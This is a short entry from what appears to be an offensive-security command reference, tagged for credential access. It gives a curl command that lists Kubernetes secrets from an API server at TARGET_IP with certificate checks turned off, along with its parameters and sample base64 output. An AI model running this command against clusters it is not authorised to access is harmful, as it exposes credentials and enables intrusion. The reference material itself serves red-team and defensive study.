---
data: 'curl -k https://TARGET_IP:6443/api/v1/namespaces/default/secrets'
tags:
  - kubernetes
  - credential-access
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e7a0c8f8-edbe-4eee-ba5b-2857c8eecf22
created_at: '2025-12-11T06:10:10.566Z'
updated_at: '2025-12-11T06:10:10.566Z'
verified: false
validated: true
submitted: true
---
# curl-get-kubernetes-secrets

## Command

```bash
curl -k https://TARGET_IP:6443/api/v1/namespaces/default/secrets
```

## Description

This command retrieves a list of secrets from the Kubernetes API, potentially exposing sensitive credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure mode | Yes |
| `endpoint` | Secrets API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -k https://TARGET_IP:6443/api/v1/namespaces/default/secrets
```

## Expected Output

JSON list of secrets, e.g., {"kind":"SecretList", "items":[{ "data": {"key":"base64value" }}]}

## Related

- [[procedures/Extract-Internal-Credentials-from-Kubernetes]]
- [[commands/curl-kubernetes-api-access]]
